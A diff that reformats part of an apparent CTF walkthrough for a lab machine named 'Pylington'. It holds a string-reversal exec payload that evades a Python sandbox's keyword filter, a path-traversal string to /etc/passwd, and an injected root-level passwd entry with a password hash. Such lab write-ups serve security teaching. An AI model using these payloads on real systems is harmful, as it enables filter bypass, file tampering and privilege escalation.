@@ -114,7 +114,17 @@ The `noimportos_sandbox.py` checks the input string if contains these 3 strings 
 We can simple execute these disallowed values using the reverse order,
 For example the `tropmi[::-1]` == `import`
 
-Our stealth code is `exec(')"imaohw"(metsys.so ;so tropmi'[::-1])` equals to : `exec("import os; os.system("whoami")`
+Our stealth code is :
+
+```python
+exec(')"imaohw"(metsys.so ;so tropmi'[::-1])
+```
+
+equals to :
+
+```python
+exec("import os; os.system("whoami")
+```
 
 ![image](/assets/img/pylington/6.PNG)
 
@@ -266,12 +276,16 @@ alienum:$1$OFv8605C$Ijg./7PjFUq2HdzInVpFS1:0:0::/root:/bin/bash
 
 #### Final Step
 
-Because the script checks online the starting string we can file inclusion the `/srv/backups/../../etc/passwd`
+Because the script checks online the starting string we can file inclusion the ```/srv/backups/../../etc/passwd```
 So, i typed :
 
-`alienum:$1$OFv8605C$Ijg./7PjFUq2HdzInVpFS1:0:0::/root:/bin/bash`
+```
+alienum:$1$OFv8605C$Ijg./7PjFUq2HdzInVpFS1:0:0::/root:/bin/bash
+```
 
-`/srv/backups/../../etc/passwd`
+```
+/srv/backups/../../etc/passwd
+```
 
 
 ```sh
